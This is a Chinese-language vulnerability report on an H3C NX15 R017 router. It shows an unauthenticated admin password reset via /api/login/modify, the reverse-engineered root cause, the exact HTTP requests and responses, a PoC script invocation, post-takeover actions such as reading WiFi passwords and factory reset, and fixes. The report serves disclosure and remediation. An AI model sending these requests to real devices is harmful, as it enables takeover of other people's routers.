# H3C NX15 R017 未授权修改管理员密码漏洞验证报告

## 1. 结论
已确认目标 `192.168.8.1` 上的 H3C NX15 R017 存在 **未认证管理员密码修改** 漏洞：

- 漏洞接口：`POST /api/login/modify`
- 影响：攻击者无需登录即可将管理员密码修改为任意值
- 结果：攻击者随后可使用新密码登录并获得有效管理会话
- 漏洞等级：高危
- 利用复杂度：低
- 前置条件：可访问 Web 管理面

该漏洞可直接导致：
- 完整设备接管
- 后续访问所有 `AUTHENTICATION` 保护的 `/api/esps` 管理接口
- 结合其它高危管理操作实现进一步持久化、配置篡改和服务控制

---

## 2. 漏洞成因
### 2.1 路由与认证边界错误
逆向 `www/api` 可见：
- `/api/login/modify` 由 `FCIG_LoginProcess` 路由
- 其分支直接执行：
  - `FCGI_UbusPassThrough("esps.system", "changepasswd", body)`
- 该分支 **没有** 使用 `HTTP_AUTHENTICATION` 做会话校验

而 `/api/login/quit` 才显式读取：
- `getenv("HTTP_AUTHENTICATION")`

说明 `/api/login/modify` 被错误地归入了“预登录可访问接口”。

### 2.2 后端脚本进一步放大影响
`usr/libexec/rpcd/esps.system` 中 `changepasswd` 逻辑：
- 当 `password_consistent_switch == 1` 时
- 若传入 `newPass` 合法，则直接：
  - `uci set system.system.password="$(echo \"${newPass}\" | base64)"`
  - `uci commit system`
  - reload system / telnet

并且在该模式下：
- **不会校验 oldPass 是否正确**

设备默认配置中：
- `/etc/config/system`
  - `option password_consistent_switch '1'`

因此形成完整利用链：
1. 未认证调用 `/api/login/modify`
2. FastCGI 无认证地转发到 `esps.system changepasswd`
3. 后端脚本在一致性模式下不验证旧密码
4. 新密码被直接写入配置并生效

---

## 3. 关键证据
### 3.1 默认配置
文件：`/home/coconut/router_digout/NX15R017/etc/config/system`

关键项：
- `option factory_state '1'`
- `option password_consistent_switch '1'`
- `option password 'YWRtaW4K'`

### 3.2 IDA 逆向证据
目标二进制：
- `/home/coconut/router_digout/NX15R017/www/api`

关键函数：
- `FCIG_LoginProcess`
- `FCGI_UbusPassThrough`

关键逻辑：
- `/login/modify` -> `FCGI_UbusPassThrough("esps.system", "changepasswd", body)`
- 无 `HTTP_AUTHENTICATION` 校验

后端脚本：
- `/home/coconut/router_digout/NX15R017/usr/libexec/rpcd/esps.system`

关键逻辑：
- `password_consistent_switch == 1` 时仅校验新密码格式
- 不要求正确旧密码

---

## 4. 动态验证
### 4.1 未授权修改密码请求
请求：
```http
POST /api/login/modify HTTP/1.1
Host: 192.168.8.1
Content-Type: application/json

{"newPass":"TmpPass123!"}
```

响应：
```json
{"code":0}
```

### 4.2 用新密码登录成功
请求：
```http
POST /api/login/auth HTTP/1.1
Host: 192.168.8.1
Content-Type: application/json

{"username":"admin","password":"TmpPass123!"}
```

响应：
```json
{"code":0,"message":"Success","data":{"session":"08ffcf3a"}}
```

说明未授权密码修改已经生效，且可拿到合法会话。

### 4.3 恢复验证
随后再次未授权调用 `/api/login/modify` 将密码恢复为 `admin123`，并验证登录成功，说明漏洞具备稳定可重复性。

---

## 5. 漏洞利用脚本
POC 已写入：
- `/home/coconut/router_digout/POC/h3c/NX15R017/preauth_login_modify_takeover.py`

示例：
```bash
python3 /home/coconut/router_digout/POC/h3c/NX15R017/preauth_login_modify_takeover.py \
  --base http://192.168.8.1 \
  --username admin \
  --old-password admin123 \
  --new-password TmpPass123! \
  --restore
```

功能：
- 基线登录验证
- 未认证修改管理员密码
- 用新密码登录验证接管
- 可选恢复原密码

---

## 6. 影响评估
攻击者可在**未登录**前提下：
- 直接接管 Web 管理权限
- 获取有效 session
- 调用所有受保护的 `/api/esps` 接口

进一步影响包括但不限于：
- 修改 WAN/LAN/WiFi 配置
- 修改管理员/设备密码
- 触发重启、恢复、导出、上传等高权限动作
- 开启远程运维 / telnet / BLE 等控制面能力（视具体后端接口而定）

---

## 7. 修复建议
1. 将 `/api/login/modify` 从预登录路由移除，强制要求已认证会话
2. 在 `esps.system changepasswd` 中无论模式如何，均校验旧密码
3. 将密码一致性逻辑与旧密码校验解耦，避免“同步模式”绕过认证
4. 为所有敏感操作增加统一认证中间层，而不是按路径零散放行

---

## 8. 当前状态
- 漏洞：已确认
- 影响：已确认
- POC：已完成
- 真机验证：已完成
- 环境恢复：已恢复为 `admin123`


## 9. 关联的后置影响（摘要）
在使用该漏洞接管后台后，已进一步确认管理员会话可访问高危能力，包括：
- 导出设备日志：`esps.system.log export`
- 导出配置备份：`esps.system backupprofile`
- 导出诊断包：`esps.system.diagnose export`
- 读取 WiFi SSID 与明文口令：`esps.wifi getssid`
- 触发设备重启：`esps.system reboot`
- 触发恢复出厂：`esps.system reset`

详见：
- `/home/coconut/router_digout/cve_report/h3c/NX15R017/02_postauth_highrisk_matrix.md`
